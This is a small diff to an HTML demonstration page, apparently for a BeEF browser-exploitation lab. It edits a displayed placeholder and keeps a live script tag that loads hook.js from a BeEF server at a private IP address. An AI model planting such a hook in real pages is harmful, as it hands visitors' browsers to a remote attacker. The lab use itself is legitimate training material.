@@ -96,7 +96,7 @@
                 <h4>This HTML file contains the BeEF Hook</h4>
                 Get your ip <b>ifconfig</b>
                 <br/>
-                <b><script src="http://[YOUR_IP]:3000/hook.js"></script></b>
+                <b><script src="http://<IP>:3000/hook.js"></script></b>
                 <br/>
                 <script src="http://192.168.63.139:3000/hook.js"></script>
                 <br/>
